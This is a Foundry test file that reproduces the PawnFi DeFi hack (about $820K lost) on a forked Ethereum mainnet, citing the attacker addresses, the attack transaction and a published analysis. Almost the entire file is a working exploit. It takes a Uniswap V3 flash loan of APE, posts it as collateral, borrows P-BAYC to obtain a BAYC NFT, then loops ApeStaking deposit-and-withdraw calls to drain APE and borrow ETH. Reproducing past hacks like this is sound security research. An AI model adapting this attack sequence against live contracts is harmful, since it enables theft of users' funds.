// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$820K
// Attacker : https://etherscan.io/address/0x8f7370d5d461559f24b83ba675b4c7e2fdb514cc
// Attacker Contract : https://etherscan.io/address/0xb618d91fe014bfcb9c8d440468b6c78e9ada9da1
// Vulnerable Contract : https://etherscan.io/address/0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C#code
// Attack Tx : https://etherscan.io/tx/0x8d3036371ccf27579d3cb3d4b4b71e99334cae8d7e8088247517ec640c7a59a5

// @Analysis
// https://blog.solidityscan.com/pawnfi-hack-analysis-38ac9160cbb4

interface ApeStakingStorage {
    struct DepositInfo {
        uint256[] mainTokenIds;
        uint256[] bakcTokenIds;
    }

    struct StakingInfo {
        address nftAsset;
        uint256 cashAmount;
        uint256 borrowAmount;
    }

    struct StakingConfiguration {
        uint256 addMinStakingRate;
        uint256 liquidateRate;
        uint256 borrowSafeRate;
        uint256 liquidatePawnAmount;
        uint256 feeRate;
    }
}

interface IApeCoinStaking {
    struct PairNft {
        uint128 mainTokenId;
        uint128 bakcTokenId;
    }

    struct SingleNft {
        uint32 tokenId;
        uint224 amount;
    }

    struct PairNftDepositWithAmount {
        uint32 mainTokenId;
        uint32 bakcTokenId;
        uint184 amount;
    }

    struct PairNftWithdrawWithAmount {
        uint32 mainTokenId;
        uint32 bakcTokenId;
        uint184 amount;
        bool isUncommit;
    }

    struct TimeRange {
        uint48 startTimestampHour;
        uint48 endTimestampHour;
        uint96 rewardsPerHour;
        uint96 capPerPosition;
    }
}

interface IApeStaking {
    function depositAndBorrowApeAndStake(
        ApeStakingStorage.DepositInfo memory depositInfo,
        ApeStakingStorage.StakingInfo memory stakingInfo,
        IApeCoinStaking.SingleNft[] memory _nfts,
        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs
    ) external;

    function withdrawApeCoin(
        address nftAsset,
        IApeCoinStaking.SingleNft[] memory _nfts,
        IApeCoinStaking.PairNftWithdrawWithAmount[] memory _nftPairs
    ) external;

    function setCollectRate(uint256 newCollectRate) external;

    function pools(uint256)
        external
        view
        returns (
            uint48 lastRewardedTimestampHour,
            uint16 lastRewardsRangeIndex,
            uint96 stakedAmount,
            uint96 accumulatedRewardsPerShare
        );

    function getTimeRangeBy(uint256 _poolId, uint256 _index) external view returns (IApeCoinStaking.TimeRange memory);
}

interface IPToken is IERC20 {
    function randomTrade(uint256 nftIdCount) external returns (uint256[] memory nftIds);
}

contract PawnfiTest is Test {
    Uni_Pair_V3 private constant UniV3Pool = Uni_Pair_V3(0xAc4b3DacB91461209Ae9d41EC517c2B9Cb1B7DAF);
    IERC20 private constant APE = IERC20(payable(0x4d224452801ACEd8B2F0aebE155379bb5D594381));
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ICErc20Delegate private constant sAPE = ICErc20Delegate(payable(0x73625745eD66F0d4C68C91613086ECe1Fc5a0119));
    ICErc20Delegate private constant isAPE = ICErc20Delegate(payable(0x3B2da9304bd1308Dc0d1b2F9c3C14F4CF016a955));
    ICErc20Delegate private constant CEther = ICErc20Delegate(payable(0x37B614714e96227D81fFffBdbDc4489e46eAce8C));
    ICErc20Delegate private constant iPBAYC = ICErc20Delegate(payable(0x9C1c49B595D5c25F0Ccc465099E6D9d0a1E5aB37));
    IPToken private constant PBAYC = IPToken(0x5f0A4a59C8B39CDdBCf0C683a6374655b4f5D76e);
    IERC721 private constant BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    ICointroller private constant Unitroller = ICointroller(0x0518b21F49548427EF0c16Ff26Ce8a05295F7454);
    ISimplePriceOracle private constant MultipleSourceOracle =
        ISimplePriceOracle(0x01b7234e6b24003e88b4e22d0a8d574432d3dFF6);
    IApeStaking private constant ApeStaking1 = IApeStaking(0x0B89032E2722b103386aDCcaE18B2F5D4986aFa0);
    IApeStaking private constant ApeStaking2 = IApeStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);

    function setUp() public {
        vm.createSelectFork("mainnet", 17_496_619);
        vm.label(address(UniV3Pool), "UniV3Pool");
        vm.label(address(APE), "APE");
        vm.label(address(sAPE), "sAPE");
        vm.label(address(isAPE), "isAPE");
        vm.label(address(iPBAYC), "iPBAYC");
        vm.label(address(CEther), "CEther");
        vm.label(address(PBAYC), "PBAYC");
        vm.label(address(BAYC), "BAYC");
        vm.label(address(Unitroller), "Unitroller");
        vm.label(address(MultipleSourceOracle), "MultipleSourceOracle");
        vm.label(address(ApeStaking1), "ApeStaking1");
        vm.label(address(ApeStaking2), "ApeStaking2");
    }

    function testExploit() public {
        deal(address(this), 0);
        // I add the following line of code only to make the poc work.
        // Without it the output from APE.balanceOf(P-BAYC) will be 0 and the error 'ERC20: transfer amount exceeds balance' will occur
        // In the attack tx APE balance of P-BAYC is as below. This issue occurs also with other attack txs.
        deal(address(APE), address(PBAYC), 206_227_682_165_404_022_135_955);

        emit log_named_decimal_uint("Attacker ETH balance before attack", address(this).balance, 18);
        emit log_named_decimal_uint("Attacker APE balance before attack", APE.balanceOf(address(this)), APE.decimals());
        emit log_named_decimal_uint(
            "Attacker isAPE balance before attack", isAPE.balanceOf(address(this)), isAPE.decimals()
        );

        UniV3Pool.flash(address(this), 200_000 * 1e18, 0, new bytes(1));

        emit log_named_decimal_uint("Attacker ETH balance after attack", address(this).balance, 18);
        emit log_named_decimal_uint("Attacker APE balance after attack", APE.balanceOf(address(this)), APE.decimals());
        emit log_named_decimal_uint(
            "Attacker isAPE balance after attack", isAPE.balanceOf(address(this)), isAPE.decimals()
        );
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        APE.approve(address(sAPE), APE.balanceOf(address(this)));
        sAPE.mint(APE.balanceOf(address(this)));
        sAPE.approve(address(isAPE), sAPE.balanceOf(address(this)));
        isAPE.mint(sAPE.balanceOf(address(this)));

        address[] memory cTokens = new address[](1);
        cTokens[0] = address(isAPE);
        Unitroller.enterMarkets(cTokens);

        iPBAYC.borrow(1005 * 1e18);
        // emit log_uint(PBAYC.balanceOf(address(this)));
        PBAYC.approve(address(PBAYC), PBAYC.balanceOf(address(this)));
        uint256[] memory nftIds = PBAYC.randomTrade(1);

        BAYC.setApprovalForAll(address(ApeStaking1), true);
        ApeStaking1.setCollectRate(1e18);

        uint256[] memory _mainTokenIds = new uint256[](1);
        _mainTokenIds[0] = nftIds[0];
        uint256[] memory _bakcTokenIds;
        ApeStakingStorage.DepositInfo memory depositInfo =
            ApeStakingStorage.DepositInfo({mainTokenIds: _mainTokenIds, bakcTokenIds: _bakcTokenIds});
        ApeStakingStorage.StakingInfo memory stakingInfo =
            ApeStakingStorage.StakingInfo({nftAsset: address(BAYC), cashAmount: 0, borrowAmount: 0});
        IApeCoinStaking.SingleNft[] memory _nfts;
        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs;
        ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);

        borrowEth();

        for (uint256 i; i < 20; ++i) {
            (, uint16 lastRewardsRangeIndex,,) = ApeStaking2.pools(1);
            IApeCoinStaking.TimeRange memory timeRange = ApeStaking2.getTimeRangeBy(1, lastRewardsRangeIndex);

            depositBorrowWithdrawApe(timeRange.capPerPosition);
        }
        depositBorrowWithdrawApe(APE.balanceOf(address(PBAYC)));
        APE.transfer(address(UniV3Pool), 200_000 * 1e18 + fee0);
    }

    function borrowEth() internal {
        (, uint256 accLiquidity,) = Unitroller.getAccountLiquidity(address(this));
        uint256 cashBalanceEth = CEther.getCash();
        uint256 underlyingPrice = MultipleSourceOracle.getUnderlyingPrice(address(CEther));
        uint256 liquidity = (underlyingPrice * cashBalanceEth) / 1e18;

        if (liquidity <= accLiquidity) {
            CEther.borrow(cashBalanceEth);
        } else {
            uint256 borrowAmount = (accLiquidity * 1e18) / underlyingPrice;
            CEther.borrow(borrowAmount);
        }
    }

    function depositBorrowWithdrawApe(uint256 amount) internal {
        uint256[] memory _mainTokenIds;
        uint256[] memory _bakcTokenIds;
        ApeStakingStorage.DepositInfo memory depositInfo =
            ApeStakingStorage.DepositInfo({mainTokenIds: _mainTokenIds, bakcTokenIds: _bakcTokenIds});
        ApeStakingStorage.StakingInfo memory stakingInfo =
            ApeStakingStorage.StakingInfo({nftAsset: address(BAYC), cashAmount: 0, borrowAmount: 0});
        IApeCoinStaking.SingleNft[] memory _nfts = new IApeCoinStaking.SingleNft[](1);
        _nfts[0] = IApeCoinStaking.SingleNft({
            tokenId: 9829, // nftIds[0]
            amount: uint224(amount)
        });
        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs;
        ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);
        IApeCoinStaking.PairNftWithdrawWithAmount[] memory nftPairs_;
        ApeStaking1.withdrawApeCoin(address(BAYC), _nfts, nftPairs_);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
